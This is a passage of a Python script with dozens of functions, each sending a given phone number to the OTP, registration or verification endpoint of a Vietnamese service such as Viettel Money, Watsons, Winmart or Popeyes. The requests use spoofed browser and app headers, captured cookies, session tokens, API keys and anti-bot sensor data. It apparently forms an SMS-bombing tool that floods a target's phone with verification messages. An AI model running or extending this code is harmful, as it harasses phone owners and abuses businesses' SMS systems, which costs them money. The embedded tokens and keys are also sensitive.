        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'phone': sdt,
    }

    response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
    
def send_otp_via_emartmall(sdt):
    cookies = {
        'emartsess': '30rqcrlv76osg3ghra9qfnrt43',
        'default': '7405d27b94c61015ad400e65ba',
        'language': 'vietn',
        'currency': 'VND',
        'emartCookie': 'Y',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'emartsess=30rqcrlv76osg3ghra9qfnrt43; default=7405d27b94c61015ad400e65ba; language=vietn; currency=VND; emartCookie=Y',
        'DNT': '1',
        'Origin': 'https://emartmall.com.vn',
        'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'mobile': sdt,
    }

    response = requests.post(
        'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
        cookies=cookies,
        headers=headers,
        data=data,
    )
    
def send_otp_via_ahamove(sdt):

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://app.ahamove.com',
        'priority': 'u=1, i',
        'referer': 'https://app.ahamove.com/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'mobile': sdt,
        'country_code': 'VN',
        'firebase_sms_auth': True,
    }

    response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data)
    
def send_otp_via_ViettelMoney(sdt):

    url = "https://api8.viettelpay.vn/customer/v2/accounts/register"

    payload = json.dumps({
    "identityType": "msisdn",
    "identityValue": sdt,
    "type": "REGISTER"
    })

    headers = {
    'User-Agent': "Viettel Money/8.8.8 (com.viettel.viettelpay; build:3; iOS 17.0.2) Alamofire/4.9.1",
    'Accept-Encoding': "gzip;q=1.0, compress;q=0.5",
    'Content-Type': "application/json",
    'app-version': "8.8.8",
    'product': "VIETTELPAY",
    'type-os': "ios",
    'accept-language': "vi",
    'imei': "DAC772F0-1BC1-41E4-8A2B-A2ACFC6C63BD",
    'device-name': "iPhone",
    'os-version': "16.0",
    'authority-party': "APP",
    'Cookie': "_cfuvid=LAz8zVX12FF46VbA10qwPet5oT9iRMPRjuqQY5gK2_Q-1722405472979-0.0.1.1-604800000; __cf_bm=yVd7Vck.vpCRs0GU0WsQidPJgvwCAz77zL_F_DRq98k-1722405467-1.0.1.1-eqfWY8VnQhNl9u9CbrHJ1HJYeuy_mkVC7NP6JWCnwgF5TBDChHaIL13xaPd_qsuu_TNacDBFSs2EyDjLV.Larg"
    }

    response = requests.post(url, data=payload, headers=headers)

    
def send_otp_via_xanhsmsms(sdt):
        # Kiểm tra và chuyển đổi số điện thoại
    if sdt.startswith('09'):
        sdt = '+84' + sdt[1:]
    elif sdt.startswith('03'):
        sdt = '+84' + sdt[1:]
    url = "https://api.gsm-api.net/auth/v1/public/otp/send"

    params = {
    'aud': "user_app",
    'platform': "ios"
    }

    payload = json.dumps({
    "is_forgot_password": False,
    "phone": sdt,
    "provider": "VIET_GUYS"
    })

    headers = {
    'User-Agent': "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
    'Accept': "application/json",
    'Accept-Encoding': "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
    'Content-Type': "application/json",
    'app-version-label': "3.15.0",
    'app-build-number': "89",
    'accept-language': "vi",
    'platform': "iOS",
    'aud': "user_app"
    }

    response = requests.post(url, params=params, data=payload, headers=headers)

def send_otp_via_xanhsmzalo(sdt):


        # Kiểm tra và chuyển đổi số điện thoại
    if sdt.startswith('09'):
        sdt = '+84' + sdt[1:]
    elif sdt.startswith('03'):
        sdt = '+84' + sdt[1:]

    url = "https://api.gsm-api.net/auth/v1/public/otp/send"

    params = {
    'platform': "ios",
    'aud': "user_app"
    }

    payload = json.dumps({
    "phone": sdt,
    "is_forgot_password": False,
    "provider": "ZNS_ZALO"
    })

    headers = {
    'User-Agent': "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
    'Accept': "application/json",
    'Accept-Encoding': "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
    'Content-Type': "application/json",
    'app-version-label': "3.15.0",
    'app-build-number': "89",
    'accept-language': "vi",
    'platform': "iOS",
    'aud': "user_app"
    }

    response = requests.post(url, params=params, data=payload, headers=headers)


def send_otp_via_popeyes(sdt):

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://popeyes.vn',
        'ppy': 'CWNOBV',
        'priority': 'u=1, i',
        'referer': 'https://popeyes.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-client': 'WebApp',
    }

    json_data = {
        'phone': sdt,
        'firstName': 'Nguyễn',
        'lastName': 'Ngọc',
        'email': 'th456do1g110@hotmail.com',
        'password': 'et_SECUREID()',
    }

    response = requests.post('https://api.popeyes.vn/api/v1/register', headers=headers, json=json_data)

    
def send_otp_via_ACHECKIN(sdt):
    # Request 1
    url1 = "https://codepush.appcenter.ms/v0.1/public/codepush/update_check"

    params1 = {
    'deployment_key': "NyrEQrG2NR2IzdRgbTsfQZV-ZK7h_tsz8BjMd",
    'app_version': "1.5",
    'package_hash': "d2673f8362359fe9129b908e7fd445482becea4d3220ed385d58cae33c7e0391",
    'label': "v39",
    'client_unique_id': generate_random_id()
    }

    headers1 = {
    'User-Agent': "AppotaHome/29 CFNetwork/1474 Darwin/23.0.0",
    'Accept': "application/json",
    'Content-Type': "application/json",
    'x-codepush-plugin-version': "5.7.0",
    'x-codepush-sdk-version': "^3.0.1",
    'Accept-Language': "vi-VN,vi;q=0.9",
    'x-codepush-plugin-name': "react-native-code-push"
    }

    response1 = requests.get(url1, params=params1, headers=headers1)
    print("Response ACHECKIN 1:", response1.text)

    # Request 2
    url2 = "https://id.acheckin.vn/api/graphql/v2/mobile"

    payload2 = json.dumps({
    "operationName": "IdCheckPhoneNumber",
    "variables": {
        "phone_number": sdt
    },
    "query": "query IdCheckPhoneNumber($phone_number: String!) {\n  mutation: checkPhoneNumber(phone_number: $phone_number)\n}\n"
    })

    headers2 = {
    'User-Agent': "AppotaHome/29 CFNetwork/1474 Darwin/23.0.0",
    'Content-Type': "application/json",
    'accept-language': "vi-VN,vi;q=0.9",
    'authorization': "undefined"
    }

    response2 = requests.post(url2, data=payload2, headers=headers2)
    print("Response ACHECKIN 2:", response2.text)

    # Request 3
    payload3 = json.dumps({
    "operationName": "RequestVoiceOTP",
    "variables": {
        "phone_number": sdt,
        "action": "REGISTER",
        "hash": "6af5e4ed78ee57fe21f0d405c752798f"
    },
    "query": "mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) {\n  requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash)\n}\n"
    })

    response3 = requests.post(url2, data=payload3, headers=headers2)
    






def send_otp_via_APPOTA(sdt):


    # Request 1
    url1 = "https://mobile.useinsider.com/api/v3/session/start"

    payload1 = json.dumps({
    "insider_id": random_id,
    "partner_name": "appotapay",
    "reason": "default",
    "udid": random_id,
    "device_info": {
        "location_enabled": False,
        "app_version": "5.2.10",
        "push_enabled": True,
        "os_version": "17.0.2",
        "battery": 90,
        "sdk_version": "13.4.3-RN-6.4.4-nh",
        "connection": "wifi"
    }
    })

    headers1 = {
    'User-Agent': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
    'Content-Type': "application/json",
    'ts': "1722417438",
    'accept-language': "vi-VN,vi;q=0.9"
    }

    response1 = requests.post(url1, data=payload1, headers=headers1)
    print("Response APPOTA 1:", response1.text)

    # Request 2
    url2 = "https://api.gw.ewallet.appota.com/v2/users/check_valid_fields"

    payload2 = json.dumps({
    "phone_number": sdt,
    "email": "",
    "username": "",
    "ts": 1722417439,
    "signature": "480518ec08912b650efe1eaa555c2c55e47d2be2b2c98600616de592b3cafc11"
    })

    headers2 = {
    'User-Agent': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
    'Content-Type': "application/json",
    'client-version': "5.2.10",
    'aw-device-id': formatted_device_id,
    'language': "vi",
    'client-authorization': "GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP",
    'x-device-id': formatted_device_id,
    'x-client-build': "119",
    'x-client-version': "5.2.10",
    'platform': "ios",
    'accept-language': "vi-vn",
    'x-client-platform': "ios",
    'ref-client': "appwallet",
    'x-request-id': "3643ec43-20c4-446d-b3b0-0ac86adf5528",
    'x-request-ts': "1722417439"
    }

    response2 = requests.post(url2, data=payload2, headers=headers2)
    print("Response APPOTA 2:", response2.text)

    # Request 3
    url3 = "https://api.gw.ewallet.appota.com/v2/users/register/get_verify_code"

    payload3 = json.dumps({
    "phone_number": sdt,
    "sender": "SMS",
    "ts": 1722417441,
    "signature": "5a17345149daf29d917de285cf0bf202457576b99c68132e158237f5caec85a5"
    })

    headers3 = {
    'User-Agent': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
    'Content-Type': "application/json",
    'client-version': "5.2.10",
    'aw-device-id': formatted_device_id,
    'language': "vi",
    'client-authorization': "GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP",
    'x-device-id': formatted_device_id,
    'x-client-build': "119",
    'x-client-version': "5.2.10",
    'platform': "ios",
    'accept-language': "vi-vn",
    'x-client-platform': "ios",
    'ref-client': "appwallet",
    'x-request-id': "4031b828-a4fc-45cb-aeac-c6e3b2f504ab",
    'x-request-ts': "1722417441"
    }

    response3 = requests.post(url3, data=payload3, headers=headers3)
    






def send_otp_via_Watsons(sdt):

    url = "https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep"

    params = {
    'lang': "vi"
    }

    payload = json.dumps({
    "otpTokenRequest": {
        "action": "REGISTRATION",
        "type": "SMS",
        "countryCode": "84",
        "target": sdt
    },
    "defaultAddress": {
        "mobileNumberCountryCode": "84",
        "mobileNumber": sdt
    },
    "mobileNumber": sdt
    })

    headers = {
    'User-Agent': "WTCVN/24050.8.0 (iOS/17.0.2)",
    'Accept': "application/json, text/plain, */*",
    'Content-Type': "application/json",
    'x-session-token': "5b3f554c05258ea55ab506a1ffc7aa8d",
    'baggage': "sentry-environment=preprod,sentry-public_key=8d22ab30a0174b6489b1e647ff6a8a28,sentry-release=vn.com.watsons.app%4024050.8.0%2B202407111813,sentry-trace_id=57b207211ecb40ad880861651a5e1914",
    'waiting-room-access-token': "",
    'x-app-name': "Watsons%20VN",
    'x-acf-sensor-data': "4,i,QeSJMIt5h2iaPmIbvXvXq4tVimb8YYYoz9HVkaOkZ4+50dFkANwHVTHJruLOhscngAw9Ajbz0ri+8cJcbazXBtp8Zn1dVjoqDt2YHcMy/yzo2Wjm+Zbvhxlb9t428/+fUnEMAsO67eNo5E8d2NjKOEFsAS+/AhDaXP0+raig9UU=,nAPyAaP9OJeaQNum0Y6YD8WCUBTFQKSGe/JvZkOrtTuLVg4V6hbPeNgDHVgxQeTc1kD+f39Lpk9739rigwa9dWFav4AM7lc8JpVCNuDFC44k5/UQKyt8gAZz+9hkEk6wzYB7o2ezvooWZEXQTZumLksEu6Nf41juprM/tD3KBmI=$aJlQYeu3STdiNVsCLafUiwIVlripRB7DryJ/pryQxWgt9YARYvUYvtlimSI3+JINoWHI8r0Y8YFlvO05cWO3EWGcnHwfJaLseoEqCrawXsvXQWPlmhCGS5Z/HkoiZXqG9ndxI5U2+g9ctzMSkgHCio/kDfwe5VXZXhIeuO0q7ErIgEPOpvI2p6o28qNKdhPClcelW/KTSgG3g4/8Iujh7lTYukUAuRiwNpHMsaIVkzjit4WqrRYAPSkxYLQedWNvmi4Gs/qmofkJ1i0c0+al/IcBlrVljBDYHNeS4l88WN1s7BcQSLgFOmsd0hgXsKM7MHF5d76Tyge6ozb78qY/hlSkXOkCsiKxDjeARTOVQBoeULBvmaZfJKdGX/ssGJV1Wd8RggfkFE3eZ8sR4iLR3ZuL/7GCYdEoPATUPg7B/yZoph/TBVhqnvmejFRYEnBgAWOkxykftwUMydzMMDvJaIaJjGfjrKo7IjPoIe/gORiSFNp5xcHj+vpOuT0IRbjxZIUU3UBvmFKwBKBtfAg+k/VfZAbywLzg4IpPXci4Kh1NyXvFH2X627l/C8z9PHdNht0xQsGgR6vN/KNXxiiWo+bmHtaH8XuQT79HTp/b0mAYSX+Q230Zsj5VuAa7JPkn6Cmh6iv/JzjpmpKWi0o3TVuBPPHDeWlH3QkG69zOu8D3FGYc9heB7Ewdo/ULWqpns4LxktY2owIAJgOkYa45INprEv7pONYuK/EYDcs2mt1XLrum/F+MVgcjhdWN/SRkdjFWxQVweZdWqFbeQlz8Yp80Je9l74YHZTLMjM2T0TTKDAWgybHFkOgbyTIhbM/gqRM0j7uWeuTO0XsYOB5100oFCpsZdo09dLkAvScfMIV7Jo8hGMpK+YW0q8puk5CmwUNep1YZ8O6pn+wFer719QiExqWEKS/doPMo6c6TDTgqO2y+PFlM5aDCZ+qerdKmrLN7sqXsfhafE3p1sPWwYuoMUk4RF1eOOZan6xB3oNkRGFcj4wQZ6iphn5aiYQT4fRY4O0fOXgjRZX3xTRzdcu0IpIydGPbr/L4DCgnZ97sPjK7AxiKdyP5G90CAIkeUt8ljrn/EnZMfTN2LcBotvAPxdW40qFUFJUqH4N/P3hP3fUG+2BEIH9x0n9NcxgZvHzvMIQykV0aTJVp7BnYz6wmNuXYP9XtzReyf1vmkSbUkgQut8aparNwvzjbMKUnIKwghbTdQjr4YlVPmcHs41fjHww/TXswRfh0DjnVII+R8mqsJB1ALYgtR2cvfsYRlKDRSJy26UJs3Amsr6PNZ7ifZeAOgLbC+q60StH8QihgPRo4Cx47kxXaVCRlt68w+uRahd8PWHrFaVjlLSYxoCMy0BunTQKCj01isZTLK4xTMG0Gw1Ehl3JZQq9pw4RrWn03Mr12gOPgPyJa2fEcA+tqUctJf/64Mdwrs6EFQVOhpAXI6mE/ygKjhLYrG8VZ6soYVhGF8KWm+sMe3SYziyQKZaa+GPf1kCOQfU3z8MtGaX0KiKUhLrgxklVoI9ZnHmYg0xs2oAt+YCFd8EHR77FsmQvRJ/8O6re+Yu+tp66m7P+SWWxvy3R4Kwm2oKPzUk4ISLcBOvB3rxSBSwpZNhpGa1koC674nuYdwvKfIko0pubtQNPfuwjqceLxrmnA3mIcG6yGhImSo/VwIxeiAyhICFTYGIyPuXLw2Rl14w5SUJpXNtRVeaoec4II4ZGIvBf/idM5/Op5J24Kwx43qcsuUNhh9F8uEKctYHVjGqyXNN3rVa9JMMldNXFKgZmkbb10azJyQ68HIFwoL4KvpbtK3QIEr2eWg1CWN74XI7G+j5ulKDQPSNY7g5ifPAVwd9pM5kRH/j3sb11UQuqZh8++cr7Q2AZJk4SVmZvjazx18k5x9cJ1YO8FQu2t0k8ADMgbkL6XOSyZYOY1zplUJuzQggaEP6SJZK3UqqwTq89qFh6FAb/fcIV8rh5Ea3zmCxYIeH9AsokRHvS/CL6KunU1pa6NBSS/eDywmAjRlcg2f2w24lxW/H4Nj76Y7dIi4RsZZsdG0FgsDOwjopoE6uZvWkkUV7aYwbiFiI0sguV0Dyi6S2+cFZZ55oB6DD0fcduI0MDYhBtQ9HcbMBSeSIp0YK96+ZnhtNzOX4xCAlKbj8QqHH27/SBFt4rVPMczd8GreGjvtRDu6iAKOxd5Ak2RKMcVzQy0pfOipbRSovaW8AaOZeasY6uEUZdwbSAMqKmImO5I+GXWdojVLOl373EMLY91A+ZM+1Cz3L/8NViadUn2e88kSVcUQHbapvKJ/i9ouoYj90a7oRtmLGShIU50Ajlse27WxW/MN56I7NtiHJAf1zRhDfdT7vbGhSMf9XF3RT151Y8PuA3rQXrtc5zUjcHu02c1LSjdOt+rkS/aAMU4zn0V4l63m6N2gBVWhGNYrqOG+FVucY4+K62cT1YFHrjLJbVOqur7Yu6cNLDGl9iQRUjBW5d205t2oL65eXjkWzpuvKhvG079AvoWzFWX/lQ7C9DVn9GP5ZjMLnGBXzSbNJqsNAsdexWh72cACFFoKDnHSYjH2a3/zVT2iIUpzSdxXbIsS/Y6eK5SSmEYFgI9qLfLKiUzGHCbZSzOBNveuIvORg0JzQBp0TlyDaPNtTeGT74uxVJcb2wREhg37ns5VsqwI8+jEF0wAw5L6MPfNjD68SxiuqLHYmaDX/UvIM7Fohm97xevR/7QIJKP0rrHYyfmDQmvYWlEAoKbVU6Jzfo/8Rlvjx0OFrV8hHj7V0zrz/Ea66oqa3+R+FGLCtkcfy2eh93t6Z4HztaNZLTBF5vLrcsa0t1pH/i0O4vPqzUeQ6m+IY+nX/z/NFjcK6S5zhN8CehlX24NyqXZZseaQGo+1Hxk423R4Ro+JeUknKGZZqOQD7K5DhSn9amppwBfHa2LQcrNbnHfGdHPvl+yhcr0NiNUqE73nma+UqE2wPdhoMX0p3fJcRCSWoREN09kG29NaEq6BIu22kb7DcA+0317aRgTlm1seU8Hq9HwLFiuGTEDnQ4XXByqK3SeBojROf42u/bKnkuLUt0Ymm5ukshP8nC7jeX5c++s1qZpW/FER7vHBCYwwuVsE8Mk1zbOdEkLhOGQ27l2A9qIXo8R3445aNnluly2IAZRmkkgsziikEEevqhT2UYoSBWC5HR3CI1ZcQJOe5qsuECIXG2AyhCtbIHKdijP0pOW8iQ==$7,3,12$$",
    'accept-language': "vi",
    'queue-target': "null",
    'cache-control': "no-cache",
    'sentry-trace': "57b207211ecb40ad880861651a5e1914-4b3ff6172e084c9d-0",
    'x-app-version': "24050.8.0",
    'env': "prod",
    'Cookie': "ak_bmsc=4ACC8C3607E0E9232360FDA1E1854E4F~000000000000000000000000000000~YAAQ9VJNG979NwaRAQAA/r9eCBi3G4NOUhKyBSBzBjyDhSfmrUMlGbtziWkFwdlHDattQysx6ioqzAwBYysRMFRqwZNTLa5UIwKiMCqQK52EXJca1/mPkvDYKlUNY6jMqBp8gA0T/uUQNLb+ADwajazL1i/y/uerZjb1BWt4OlsKrjPijiMfqPIW3MhtNi0jydTzlN2GyA9+mOZ16Vbsvdlo4Y+wr1aQAz+eqVktxM+b61s5xpAUDRo5bItDmWb2AjIJyyFU6QmLtiO+z/fwZvUUinqpOZpqrPboLMWwk8M2Jw6KKE/FIloJcpNvF+MUcPxGpI2YlEYshvYxxxYBH+Vn9mdRSYayp6sadTKWrMhVgaObxee0B9CzbCgiY+yxTlapAx7YiqgX4Q==; dtCookie=v_4_srv_36_sn_3F2A2BE1202593EA006C41DC139C0176_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0; ROUTE=.accstorefront-78c88c89d7-lvpvg; authorization=pUbs8G_8XY2Hx9NiB8aJ3NCtnxk; token_type=guest"
    }

    response = requests.post(url, params=params, data=payload, headers=headers)
    


def send_otp_via_hoangphuc(sdt):
    cookies = {
        'form_key': 'fm7TzaicsnmIyKbm',
        'mage-banners-cache-storage': '{}',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'PHPSESSID': '450982644b33ef1223c1657bb0c43204',
        'form_key': 'fm7TzaicsnmIyKbm',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-cache-sessid': 'true',
        'mst-cache-warmer-track': '1722425411057',
        'private_content_version': 'e7d88709c6ccef5f8c32a41289ece818',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=fm7TzaicsnmIyKbm; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; PHPSESSID=450982644b33ef1223c1657bb0c43204; form_key=fm7TzaicsnmIyKbm; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-cache-sessid=true; mst-cache-warmer-track=1722425411057; private_content_version=e7d88709c6ccef5f8c32a41289ece818',
        'dnt': '1',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6IjA5YWE0NzczZGUzM2IxNTciLCJ0ciI6ImFiMWFmYzBkNDUwMTE1Y2U5ZTE0ZjdhZmZmOTI3MTQ5IiwidGkiOjE3MjI0MjU0NDExMDMsInRrIjoiMTMyMjg0MCJ9fQ==',
        'origin': 'https://hoang-phuc.com',
        'priority': 'u=1, i',
        'referer': 'https://hoang-phuc.com/customer/account/create/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-ab1afc0d450115ce9e14f7afff927149-09aa4773de33b157-01',
        'tracestate': '1322840@nr=0-1-4173019-1120237972-09aa4773de33b157----1722425441103',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action_type': '1',
        'tel': sdt,
    }

    response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data)
    


def send_otp_via_fmcomvn(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'Bearer',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://fm.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fm.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
        'x-emp': '',
        'x-fromweb': 'true',
        'x-requestid': '00c641a2-05fb-4541-b5af-220b4b0aa23c',
    }

    json_data = {
        'Phone': sdt,
        'LatOfMap': '106',
        'LongOfMap': '108',
        'Browser': '',
    }

    response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)

    

def send_otp_via_Reebokvn(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dnt': '1',
        'key': '63ea1845891e8995ecb2304b558cdeab',
        'origin': 'https://reebok.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://reebok.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1722425836500',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    response = requests.post(
        'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=headers,
        json=json_data,
    )
    


def send_otp_via_thefaceshop(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dnt': '1',
        'key': 'c3ef5fcbab3e7ebd82794a39da791ff6',
        'origin': 'https://thefaceshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://thefaceshop.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1722425954937',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    response = requests.post(
        'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=headers,
        json=json_data,
    )
    


def send_otp_via_BEAUTYBOX(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dnt': '1',
        'key': 'ac41e98f028aa44aac947da26ceb7cff',
        'origin': 'https://beautybox.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://beautybox.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1722426119478',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    response = requests.post(
        'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=headers,
        json=json_data,
    )
    


def send_otp_via_winmart(sdt):

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://winmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-api-merchant': 'WCM',
    }

    json_data = {
        'firstName': 'Nguyễn Quang Ngọc',
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '2000-02-05',
        'gender': 'Male',
    }

    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)

    

def send_otp_via_medicare(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
